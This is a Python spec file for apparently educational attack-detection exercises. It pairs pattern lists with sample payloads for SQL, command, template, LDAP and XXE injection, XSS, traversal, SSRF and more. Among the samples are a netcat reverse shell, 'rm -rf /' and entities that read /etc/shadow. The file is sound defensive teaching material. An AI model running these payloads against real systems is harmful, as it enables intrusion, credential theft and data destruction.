#!/usr/bin/env python3
"""specs_detect.py — lekcje wykrywania ataków i bezpiecznego API (Pyodide)."""
from gen_tasks import detect, task, tests

# ---------------------------------------------------------------- wykrywanie
DETECT = [
    ("det-sqli", "Spot a SQL injection attempt",
     ["' or", '" or', "union select", "; drop", "--", "sleep(", " or 1=1"],
     [("classic OR", "admin' OR '1'='1"), ("union", "1 UNION SELECT password FROM users"),
      ("stacked", "x'; DROP TABLE users--"), ("blind", "1 AND SLEEP(5)")],
     ["Marian Nowak", "user@example.com", "10.0.0.1", "O'Brien"],
     "request parameter", "Start with `' OR` — with the space. `'OR` without one is the same attack.",
     "Normalise first. `.lower()` plus one extra space covers `Or` and `OR` alike."),

    ("det-xss", "Spot an XSS payload",
     ["<script", "javascript:", "onerror=", "onload=", "<img", "document.cookie"],
     [("script tag", "<script>alert(1)</script>"), ("img onerror", "<img src=x onerror=alert(1)>"),
      ("javascript uri", "javascript:alert(document.cookie)"), ("svg onload", "<svg onload=alert(1)>")],
     ["Marian Nowak", "a < b and b > c", "width < height and depth > 1", ""],
     "request body", "`javascript:` and `onerror=` are case-varied by attackers — lowercase before matching.",
     "This is why output encoding beats input filtering: `<` in `a < b` is legitimate text."),

    ("det-cmdi", "Spot a command injection attempt",
     [";", "|", "&&", "$(", "`", "nc -e", "/bin/sh", "/bin/bash"],
     [("semicolon", "127.0.0.1; cat /etc/passwd"), ("pipe", "x | nc -e /bin/sh 10.0.0.1 4444"),
      ("subshell", "x$(whoami)"), ("backtick", "x`id`"), ("chained", "x && rm -rf /")],
     ["10.0.0.1", "first clause and second", "product-v2", ""],
     "hostname or parameter", "`$(` and a backtick are the same trick; both belong on the list.",
     "Never pass user input to a shell. Allow-list the arguments instead of black-listing characters."),

    ("det-traversal", "Spot a path traversal attempt",
     ["../", "..\\", "%2e%2e", "/etc/passwd", "/proc/self", "....//"],
     [("plain dots", "../../etc/passwd"), ("encoded", "%2e%2e%2fetc%2fpasswd"),
      ("windows", "..\\..\\windows\\win.ini"), ("double-encoded", "....//etc/passwd")],
     ["images/logo.png", "static/css/main.css", "/v1/users", ""],
     "URL path", "A URL is decoded before the filesystem sees it — so `%2e%2e%2f` is just `../`.",
     "Normalise the path first, then compare: the check belongs after decoding, never before."),

    ("det-ssrf", "Spot a server-side request forgery target",
     ["localhost", "127.0.0.1", "0.0.0.0", "169.254.169.254", "metadata.google.internal", "::1", "[::1]"],
     [("loopback ip", "http://127.0.0.1:8080/admin"), ("cloud metadata", "http://169.254.169.254/latest/meta-data/"),
      ("ipv6 loopback", "http://[::1]:9200/"), ("google metadata", "http://metadata.google.internal/")],
     ["https://example.com/api", "https://hartwell-labs.pl", "", "8.8.8.8"],
     "URL the server is told to fetch", "The cloud metadata address is the one that matters: 169.254.169.254.",
     "Block by resolved IP, not by hostname — `evil.example.com` can resolve anywhere."),

    ("det-jwt-none", "Catch a JWT with `alg: none`",
     ["eyj", "none"],  # placeholder, replaced below by real decoding family
     [], [], "jwt", "", ""),
]
DETECT = [d for d in DETECT if d[0] != "det-jwt-none"]

DETECT += [
    ("det-crlf", "Spot log injection through CRLF",
     ["\r\n", "%0d%0a", "\\r\\n", "%0a", "\n"],
     [("raw crlf", "user=x\r\nadmin=true"), ("encoded crlf", "user=x%0d%0aadmin=true"),
      ("bare newline", "line\ninjected")],
     ["normal user input", "10.0.0.1", "", "Marian Nowak"],
     "log line value", "A newline in a value lets an attacker forge the next log line.",
     "Strip or escape control characters before the value reaches the log — and log the length too."),

    ("det-xxe", "Spot an XXE payload",
     ["<!doctype", "<!entity", "system \"", "public \"", "&xxe;"],
     [("doctype with entity", "<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
      ("parameter entity", "<?xml version='1.0'?><!DOCTYPE t [<!ENTITY % p SYSTEM \"file:///etc/shadow\">]>")],
     ["<note><to>Bartosz</to></note>", "plain text", ""],
     "XML body", "`<!DOCTYPE` is the entry point; disallow it and external entities stop working.",
     "Best fix is not detection: parse with a library that does not resolve external entities."),

    ("det-deser", "Spot a Java deserialization gadget",
     ["rO0AB", "aced0005", "javax.", "org.apache.commons.collections", "InvokerTransformer"],
     [("java serial header", "rO0ABXNyABdqYXZhLnV0aWwucGFja2FnZQ=="),
      ("commons collections", "org.apache.commons.collections.functors.InvokerTransformer")],
     ["user=kija", "{\"role\": \"admin\"}", ""],
     "serialized blob", "The `rO0AB` header is Java serialization; untrusted deserialization is remote code.",
     "Allow-list the classes you expect, or move to JSON. There is no safe default."),

    ("det-template", "Spot a template injection",
     ["{{", "}}", "${", "<%", "#{", "__import__"],
     [("jinja", "{{7*7}}"), ("freemarker", "${7*7}"), ("erb", "<%= 7*7 %>"), ("python expr", "{{ __import__('os') }}")],
     ["Marian Nowak", "{}", "$100", ""],
     "template field", "The arithmetic check is the classic proof: `{{7*7}}` should render as text, not 49.",
     "Never build a template from user input. Render user data, do not evaluate it."),

    ("det-openredirect", "Spot an open-redirect candidate",
     ["//evil.example", "\\\\evil.example", "https://evil.example", "http://evil.example", "redirect="],
     [("protocol relative", "//evil.example/login"), ("backslash trick", "\\\\evil.example"),
      ("absolute", "https://evil.example/steal")],
     ["/dashboard", "/login?next=/home", "relative/path", ""],
     "redirect target", "`//host` is treated as a protocol-relative URL by most browsers.",
     "Allow-list the paths you redirect to; a host allow-list alone misses `//evil.example`."),

    ("det-idor", "Spot an IDOR by guessing",
     ["../", "%2f", "id=1", "id=2", "user_id=", "account="],
     [("traversal into ids", "../../user/1"), ("raw id swap", "item?id=1&account=2")],
     ["item?id=42", "/users/profile", ""],
     "API path", "Sequential ids are the tell: if `/item/1` works, `/item/2` is a request away.",
     "Authorise on the server for every object, and make ids unguessable. Both, not either."),

    ("det-ldap", "Spot an LDAP injection",
     ["*)(uid=*", ")(&", ")(cn=", "||", "%2a"],
     [("wildcard uid", "*)(uid=*))(|(uid=*"), ("and injection", "x)(&(objectClass=user)"),
      ("filter break", "admin)(cn=*)")],
     ["bartosz", "user.name", "", "10.0.0.1"],
     "LDAP search filter", "`*)(uid=*` changes the filter's meaning instead of its value.",
     "Escape the three filter metacharacters with their hex escapes before building the filter."),

    ("det-crlf-split", "Spot an HTTP response split attempt",
     ["\r\n\r\n", "%0d%0a%0d%0a", "content-length:", "location:"],
     [("double crlf", "x\r\n\r\nSet-Cookie: admin=1"), ("encoded", "x%0d%0a%0d%0aSet-Cookie: admin=1")],
     ["normal value", "application/json", ""],
     "response header value", "A double CRLF ends the headers and starts a body — or a second response.",
     "Reject CR and LF in header values outright; do not try to escape them."),

    ("det-massassign", "Spot a mass-assignment attempt",
     ["__proto__", "constructor", "prototype", '"role":', "is_admin"],
     [("proto pollution", "__proto__.isAdmin=true"), ("role field", '{"role":"admin"}'),
      ("constructor", "constructor.prototype.x=1")],
     ['{"name": "kija"}', "normal=value", ""],
     "JSON body", "A role field in the payload is normal — an extra one the API did not offer is not.",
     "Allow-list the fields you bind. Never spread the request body into your model."),
]

DETECT_TASKS = [detect(tid, title, patterns, attacks, benign, flag=flag, hint=hint, stretch=stretch)
                for tid, title, patterns, attacks, benign, flag, hint, stretch in DETECT]
